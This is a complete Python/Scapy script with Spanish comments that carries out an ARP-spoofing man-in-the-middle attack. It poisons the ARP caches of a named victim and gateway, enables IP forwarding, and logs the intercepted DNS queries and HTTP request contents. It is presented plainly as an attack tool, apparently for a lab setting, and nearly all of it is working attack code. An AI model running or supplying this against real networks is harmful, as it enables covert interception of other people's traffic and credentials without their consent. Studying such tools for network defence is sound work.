#!/usr/bin/env python3
"""
ARP MitM (ARP Spoofing / Poisoning)
Envenena las caches ARP de victima y gateway para interceptar el trafico.
Activa IP forwarding (MitM transparente) y restaura las tablas al salir.

Ejemplos:
    sudo python3 arp_mitm.py -i eth0 -t 10.3.75.130 -g 10.3.75.129
"""
import argparse
import sys
from scapy.all import (send, sniff, getmacbyip,
                       ARP, IP, TCP, UDP, DNS, DNSQR, Raw, ICMP)

def parse_args():
    ap = argparse.ArgumentParser(description="Ataque MitM por ARP spoofing")
    ap.add_argument("-i", "--iface", required=True, help="Interfaz de red")
    ap.add_argument("-t", "--target", required=True, help="IP de la victima")
    ap.add_argument("-g", "--gateway", required=True, help="IP del gateway/router")
    return ap.parse_args()

def set_ip_forward(value):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(str(value))
        print(f"[*] ip_forward = {value}")
    except PermissionError:
        print("[!] Ejecuta con sudo.")
        sys.exit(1)

def get_macs(victima, gateway):
    mac_v = getmacbyip(victima)
    mac_g = getmacbyip(gateway)
    if not mac_v or not mac_g:
        print("[!] No se pudo resolver alguna MAC. Verifica conectividad.")
        sys.exit(1)
    print(f"[*] MAC victima  {victima} -> {mac_v}")
    print(f"[*] MAC gateway  {gateway} -> {mac_g}")
    return mac_v, mac_g

def spoof(victima, gateway, mac_v, mac_g):
    send(ARP(op=2, pdst=victima, hwdst=mac_v, psrc=gateway), verbose=False)
    send(ARP(op=2, pdst=gateway, hwdst=mac_g, psrc=victima), verbose=False)

def restore(victima, gateway, mac_v, mac_g):
    print("\n[*] Restaurando tablas ARP...")
    for _ in range(5):
        send(ARP(op=2, pdst=victima, hwdst=mac_v, psrc=gateway, hwsrc=mac_g), verbose=False)
        send(ARP(op=2, pdst=gateway, hwdst=mac_g, psrc=victima, hwsrc=mac_v), verbose=False)
    print("[*] Tablas restauradas.")

def packet_log(pkt):
    if IP in pkt:
        src, dst = pkt[IP].src, pkt[IP].dst
        proto = "otro"
        if TCP in pkt: proto = "TCP"
        elif UDP in pkt: proto = "UDP"
        elif ICMP in pkt: proto = "ICMP"
        info = f"[*] {src} -> {dst} | {proto}"
        if ICMP in pkt:
            t = pkt[ICMP].type
            msg = "Ping (Request)" if t == 8 else "Reply" if t == 0 else f"Tipo {t}"
            info += f" | {msg}"
        elif pkt.haslayer(DNSQR):
            info += f" | DNS Query: {pkt[DNSQR].qname.decode(errors='ignore')}"
        elif pkt.haslayer(Raw):
            load = pkt[Raw].load.decode("utf-8", errors="ignore")
            if "GET" in load or "POST" in load:
                info += f" | HTTP: {load[:50].strip()}..."
        print(info)

def main():
    args = parse_args()
    set_ip_forward(1)
    mac_v, mac_g = get_macs(args.target, args.gateway)
    print("[!] MitM activo. Ctrl+C para detener y restaurar.")
    try:
        while True:
            spoof(args.target, args.gateway, mac_v, mac_g)
            sniff(iface=args.iface, filter=f"host {args.target}",
                  prn=packet_log, count=5, timeout=2, store=0)
    except KeyboardInterrupt:
        restore(args.target, args.gateway, mac_v, mac_g)
        set_ip_forward(0)
        print("[!] Detenido.")

if __name__ == "__main__":
    main()
